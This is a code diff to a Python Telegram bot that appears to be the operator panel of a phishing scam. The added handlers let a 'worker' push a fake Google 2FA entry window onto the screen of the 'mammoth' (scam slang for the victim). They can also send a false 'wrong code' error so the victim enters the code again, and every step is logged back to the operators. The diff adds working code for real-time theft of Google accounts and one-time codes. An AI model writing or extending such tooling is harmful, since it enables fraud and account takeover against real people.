@@ -630,6 +630,36 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             mirror_token=bot.token,
         )
 
+    elif action in ("ask_2fa", "ask_code"):
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="ask_2fa",
+            error_msg=None,
+        )
+        await callback.answer("🔢 На экран мамонта выведено окно ввода 2FA кода (G-XXXXXX)", show_alert=True)
+        await notify_user_event(
+            event_type="google_ask_2fa",
+            user_tg_id=target_tg_id,
+            details="Воркер запросил 2FA код Google",
+            mirror_token=bot.token,
+        )
+
+    elif action in ("wrong_2fa", "wrong_code"):
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="error_2fa",
+            error_msg="Неверный код. Проверьте код и повторите попытку.",
+        )
+        await callback.answer("❌ Ошибка 'Неверный 2FA код' отправлена мамонту", show_alert=True)
+        await notify_user_event(
+            event_type="google_wrong_2fa",
+            user_tg_id=target_tg_id,
+            details="Воркер отклонил 2FA код Google (Неверный код)",
+            mirror_token=bot.token,
+        )
+
     elif action == "ask_prompt":
         PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
         await callback.answer("🔢 Отправьте 2 цифры в чат", show_alert=True)
